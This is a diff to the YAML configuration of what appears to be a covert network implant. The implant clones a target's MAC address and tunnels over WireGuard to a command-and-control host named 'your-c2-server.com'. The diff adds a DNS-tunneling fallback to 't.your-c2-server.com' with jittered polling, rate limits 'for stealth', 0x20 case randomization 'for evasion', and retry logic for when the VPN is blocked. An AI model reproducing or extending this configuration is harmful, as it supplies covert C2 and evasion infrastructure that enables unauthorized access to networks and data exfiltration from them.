@@ -12,11 +12,31 @@ network:
   clone_mac: true          # Clone target MAC to WAN (stealth)
 
 tunnel:
+  # Primary: WireGuard VPN
   type: "wireguard"
   interface: "wg0"
   endpoint: "your-c2-server.com:51820"
   keepalive: 25
   reconnect_delays: [5, 10, 30, 60, 300]
+  
+  # Fallback: DNS Tunneling (when VPN is blocked)
+  dns_fallback:
+    enabled: true
+    domain: "t.your-c2-server.com"  # Your authoritative DNS domain
+    dns_servers: []                  # Empty = use system DNS
+    poll_interval: 30                # Seconds between polls
+    poll_jitter: 10                  # Random ± seconds
+    query_timeout: 10                # DNS query timeout
+    max_queries_per_minute: 30       # Rate limit for stealth
+    encoding: "base32"               # base32, hex
+    use_tcp: false                   # DNS over TCP
+    randomize_case: true             # 0x20 encoding for evasion
+  
+  # Fallback chain behavior
+  fallback:
+    enabled: true
+    primary_retries: 3               # Retries before fallback
+    restore_check_interval: 300      # Try primary every 5 min
 
 beacon:
   enabled: true
